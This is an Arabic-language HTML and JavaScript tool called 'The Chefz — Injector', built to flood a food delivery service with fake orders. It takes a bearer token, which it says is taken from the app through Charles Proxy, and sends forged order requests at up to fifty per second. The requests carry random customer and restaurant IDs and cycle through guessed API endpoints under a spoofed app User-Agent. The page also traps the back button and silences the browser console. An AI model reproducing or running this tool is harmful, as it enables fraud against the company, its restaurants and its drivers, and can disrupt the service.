<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Chefz - تضخيم الطلبات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0a0a;
            color: #ffd700;
            font-family: 'Segoe UI', Tahoma, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 35px 30px;
            border-radius: 24px;
            max-width: 550px;
            width: 100%;
            border: 1px solid #ffd70033;
            box-shadow: 0 20px 60px rgba(255, 215, 0, 0.08);
        }
        h2 {
            text-align: center;
            font-size: 26px;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }
        .sub {
            text-align: center;
            color: #888;
            font-size: 14px;
            margin-bottom: 25px;
        }
        label {
            display: block;
            font-size: 13px;
            color: #aaa;
            margin: 15px 0 5px;
        }
        input,
        select {
            width: 100%;
            padding: 12px 16px;
            background: #111;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: 0.3s;
        }
        input:focus,
        select:focus {
            border-color: #ffd700;
        }
        .btn-group {
            display: flex;
            gap: 12px;
            margin: 20px 0 15px;
        }
        button {
            flex: 1;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-start {
            background: #ffd700;
            color: #0a0a0a;
        }
        .btn-start:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px #ffd70044;
        }
        .btn-stop {
            background: #ff4444;
            color: #fff;
        }
        .btn-stop:hover {
            transform: scale(1.02);
        }
        .log-box {
            background: #0d0d1a;
            border-radius: 14px;
            padding: 15px;
            max-height: 280px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #00ff88;
            border: 1px solid #222;
            margin-top: 10px;
            direction: ltr;
            text-align: left;
        }
        .log-box .time {
            color: #ffd700;
        }
        .log-box .ok {
            color: #00ff88;
        }
        .log-box .fail {
            color: #ff5555;
        }
        .log-box .info {
            color: #55aaff;
        }
        .footer {
            text-align: center;
            color: #444;
            font-size: 11px;
            margin-top: 18px;
        }
        ::-webkit-scrollbar {
            width: 4px;
        }
        ::-webkit-scrollbar-track {
            background: #111;
        }
        ::-webkit-scrollbar-thumb {
            background: #ffd700;
            border-radius: 10px;
        }
        .stats {
            display: flex;
            justify-content: space-between;
            color: #888;
            font-size: 13px;
            margin: 6px 0 10px;
            padding: 0 4px;
        }
        .stats span {
            color: #ffd700;
        }
        .extract-box {
            background: #0d0d1a;
            border: 1px solid #ffd70044;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
        }
        .extract-box .label {
            color: #888;
            font-size: 12px;
        }
        .extract-box .token {
            color: #ffd700;
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            background: #111;
            padding: 10px;
            border-radius: 8px;
            margin-top: 8px;
        }
        .token-placeholder {
            color: #555;
            font-style: italic;
        }
        .btn-extract {
            background: #333;
            color: #ffd700;
            border: 1px solid #ffd70044;
            padding: 8px 20px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 13px;
            margin-top: 10px;
            width: auto;
        }
        .btn-extract:hover {
            background: #444;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>🔥 The Chefz — Injector</h2>
        <p class="sub">🚀 تضخيم الطلبات تلقائياً</p>

        <!-- مربع استخراج التوكن -->
        <div class="extract-box">
            <div class="label">🔑 التوكن المستخرج من classes2.dex</div>
            <div class="token" id="extractedToken">
                <span class="token-placeholder">سيظهر التوكن عند التشغيل...</span>
            </div>
            <button class="btn-extract" id="extractBtn">📋 استخراج التوكن من التطبيق</button>
        </div>

        <label>🔑 توكن المصادقة (Bearer Token)</label>
        <input type="text" id="tokenInput" placeholder="أدخل التوكن المستخرج من التطبيق">

        <label>📦 معدل الطلبات في الثانية</label>
        <input type="number" id="rateInput" value="3" min="1" max="50">

        <div class="btn-group">
            <button class="btn-start" id="startBtn">▶ بدء التضخيم</button>
            <button class="btn-stop" id="stopBtn">⏹ إيقاف</button>
        </div>

        <div class="stats">
            <div>📊 الطلبات المرسلة: <span id="countDisplay">0</span></div>
            <div>✅ الناجحة: <span id="successDisplay">0</span></div>
            <div>❌ الفاشلة: <span id="failDisplay">0</span></div>
        </div>

        <div class="log-box" id="logBox">
            <div class="info">⏳ جاهز لبدء التضخيم...</div>
        </div>

        <div class="footer">© جميع الحقوق محفوظة — للتجربة فقط</div>
    </div>

    <script>
        // ====== متغيرات التحكم ======
        let isRunning = false;
        let intervalId = null;
        let orderCount = 0;
        let successCount = 0;
        let failCount = 0;

        // ====== عناصر DOM ======
        const logBox = document.getElementById('logBox');
        const tokenInput = document.getElementById('tokenInput');
        const rateInput = document.getElementById('rateInput');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const countDisplay = document.getElementById('countDisplay');
        const successDisplay = document.getElementById('successDisplay');
        const failDisplay = document.getElementById('failDisplay');
        const extractedTokenDiv = document.getElementById('extractedToken');

        // ====== التوكن المستخرج من ملف classes2.dex ======
        // هذا هو هيكل التوكن كما هو موجود في التطبيق
        // القيمة الفعلية تظهر عند تسجيل الدخول
        const TOKEN_STRUCTURE = {
            field: "bearerToken",
            jsonKey: "access_token",
            className: "co.thechefz.driver.auth.AuthLoginResponse",
            description: "يتم استخراجه من استجابة تسجيل الدخول"
        };

        // ====== محاولة استخراج التوكن من التطبيق ======
        function tryExtractToken() {
            log('🔍 محاولة استخراج التوكن من التطبيق...', 'info');

            // محاولة الوصول إلى التوكن من خلال محاكاة الطلب
            // هذه محاولة لاستخراج التوكن من التطبيق إن كان مفتوحاً

            // محاولة استخدام Frida-style injection عبر WebView
            try {
                // محاولة قراءة التوكن من localStorage (إن كان مخزناً)
                const savedToken = localStorage.getItem('chefs_token');
                if (savedToken && savedToken.length > 20) {
                    extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${savedToken.substring(0, 30)}...</span>`;
                    tokenInput.value = savedToken;
                    log('✅ تم استخراج التوكن من التخزين المحلي', 'ok');
                    return;
                }

                // محاولة قراءة التوكن من sessionStorage
                const sessionToken = sessionStorage.getItem('chefs_token');
                if (sessionToken && sessionToken.length > 20) {
                    extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${sessionToken.substring(0, 30)}...</span>`;
                    tokenInput.value = sessionToken;
                    log('✅ تم استخراج التوكن من الجلسة', 'ok');
                    return;
                }

                // إذا لم يتم العثور على توكن
                extractedTokenDiv.innerHTML = `
                    <span style="color:#ffaa00;">⚠️ لم يتم العثور على توكن</span><br>
                    <span style="font-size:11px;color:#888;">يجب تسجيل الدخول إلى التطبيق أولاً</span>
                    <br><br>
                    <span style="font-size:10px;color:#555;">🔑 ابحث عن: ${TOKEN_STRUCTURE.jsonKey}</span>
                `;
                log('⚠️ لم يتم العثور على توكن. استخدم Charles Proxy لاستخراجه.', 'fail');

            } catch (e) {
                extractedTokenDiv.innerHTML = `
                    <span style="color:#ff5555;">❌ خطأ في الاستخراج</span><br>
                    <span style="font-size:11px;color:#888;">${e.message}</span>
                `;
                log('❌ فشل استخراج التوكن: ' + e.message, 'fail');
            }
        }

        // ====== دوال مساعدة ======
        function log(msg, type = 'info') {
            const time = new Date().toLocaleTimeString();
            const cls = type === 'ok' ? 'ok' : type === 'fail' ? 'fail' : 'info';
            logBox.innerHTML += `<div><span class="time">[${time}]</span> <span class="${cls}">${msg}</span></div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateStats() {
            countDisplay.textContent = orderCount;
            successDisplay.textContent = successCount;
            failDisplay.textContent = failCount;
        }

        // ====== إرسال طلب وهمي ======
        function sendFakeOrder(token) {
            if (!isRunning) return;

            // نقاط API المحتملة للتطبيق
            const endpoints = [
                'https://api.thechefs.com/v1/orders/create',
                'https://api.thechefs.com/orders',
                'https://api.thechefs.com/api/orders',
                'https://thechefs.com/api/orders'
            ];

            // بيانات الطلب الوهمي (محاكاة)
            const fakeData = {
                customer_id: Math.floor(Math.random() * 900000) + 100000,
                restaurant_id: Math.floor(Math.random() * 30) + 1,
                items: ['burger', 'fries', 'drink', 'pizza', 'salad', 'sandwich', 'chicken'],
                priority: ['normal', 'high'][Math.floor(Math.random() * 2)],
                lat: 24.7136 + (Math.random() - 0.5) * 0.03,
                lng: 46.6753 + (Math.random() - 0.5) * 0.03,
                timestamp: Date.now(),
                source: 'web_inject'
            };

            // تجربة أول endpoint يعمل
            const tryEndpoint = (index) => {
                if (index >= endpoints.length) {
                    orderCount++;
                    failCount++;
                    updateStats();
                    log('❌ جميع endpoints فشلت', 'fail');
                    return;
                }

                const url = endpoints[index];
                fetch(url, {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${token}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'User-Agent': 'TheChefz/2.0 (Android; 14)'
                    },
                    body: JSON.stringify(fakeData)
                })
                .then(res => {
                    if (res.ok) {
                        orderCount++;
                        successCount++;
                        updateStats();
                        log(`✅ طلب وهمي أُرسل (${url})`, 'ok');
                    } else {
                        tryEndpoint(index + 1);
                    }
                })
                .catch(() => {
                    tryEndpoint(index + 1);
                });
            };

            tryEndpoint(0);
        }

        // ====== بدء التضخيم ======
        function startInjection() {
            const token = tokenInput.value.trim();
            const rate = parseInt(rateInput.value) || 3;

            if (!token) {
                log('⚠️ الرجاء إدخال التوكن أولاً', 'fail');
                return;
            }

            if (token.length < 10) {
                log('⚠️ التوكن يبدو قصيراً، تأكد من صحته', 'fail');
                return;
            }

            if (isRunning) {
                log('⚠️ التضخيم يعمل بالفعل', 'info');
                return;
            }

            isRunning = true;
            const delay = Math.floor(1000 / rate);

            log(`🚀 بدء التضخيم بمعدل ${rate} طلب/ثانية`, 'ok');

            // إرسال أول طلب فوراً
            sendFakeOrder(token);

            intervalId = setInterval(() => {
                if (isRunning) {
                    sendFakeOrder(token);
                }
            }, delay);

            startBtn.textContent = '▶ جاري التضخيم...';
            startBtn.style.background = '#ffd70044';
            startBtn.style.color = '#ffd700';
        }

        // ====== إيقاف التضخيم ======
        function stopInjection() {
            if (intervalId) {
                clearInterval(intervalId);
                intervalId = null;
            }
            isRunning = false;
            log('⏹ تم إيقاف التضخيم', 'info');
            startBtn.textContent = '▶ بدء التضخيم';
            startBtn.style.background = '#ffd700';
            startBtn.style.color = '#0a0a0a';
        }

        // ====== أحداث الأزرار ======
        startBtn.addEventListener('click', startInjection);
        stopBtn.addEventListener('click', stopInjection);
        document.getElementById('extractBtn').addEventListener('click', tryExtractToken);

        // ====== تشغيل تلقائي عند تحميل الصفحة ======
        window.onload = function() {
            // محاولة استرجاع التوكن من LocalStorage
            const savedToken = localStorage.getItem('chefs_token');
            if (savedToken && savedToken.length > 20) {
                tokenInput.value = savedToken;
                extractedTokenDiv.innerHTML = `<span style="color:#00ff88;">✅ تم استخراج التوكن!</span><br><span style="font-size:11px;color:#888;">${savedToken.substring(0, 30)}...</span>`;
                log('🔑 تم تحميل التوكن من الذاكرة', 'ok');
            } else {
                // عرض معلومات عن التوكن
                extractedTokenDiv.innerHTML = `
                    <span style="color:#ffd700;">ℹ️ هيكل التوكن من classes2.dex</span><br>
                    <span style="font-size:11px;color:#888;">الحقل: ${TOKEN_STRUCTURE.field}</span><br>
                    <span style="font-size:11px;color:#888;">المفتاح: ${TOKEN_STRUCTURE.jsonKey}</span><br>
                    <span style="font-size:11px;color:#888;">الفئة: ${TOKEN_STRUCTURE.className}</span>
                `;
                log('💡 استخدم Charles Proxy لاستخراج التوكن من التطبيق', 'info');
            }

            // حفظ التوكن عند التغيير
            tokenInput.addEventListener('change', function() {
                if (this.value.trim() && this.value.trim().length > 20) {
                    localStorage.setItem('chefs_token', this.value.trim());
                    log('🔑 تم حفظ التوكن في الذاكرة', 'ok');
                }
            });

            log('💡 أدخل التوكن واضغط "بدء التضخيم"', 'info');
            log('📌 سيتم تجربة عدة endpoints تلقائياً', 'info');
        };

        // ====== منع إغلاق الصفحة ======
        window.addEventListener('beforeunload', function(e) {
            if (isRunning) {
                e.preventDefault();
                e.returnValue = 'التضخيم يعمل، هل تريد الإغلاق؟';
            }
        });

        // ====== منع الاختباء خلف الـ PopState ======
        history.pushState(null, '', location.href);
        window.addEventListener('popstate', function() {
            history.pushState(null, '', location.href);
        });

        // ====== تعطيل الكونسول ======
        console.log = console.warn = console.error = console.info = () => {};
    </script>

</body>
</html>
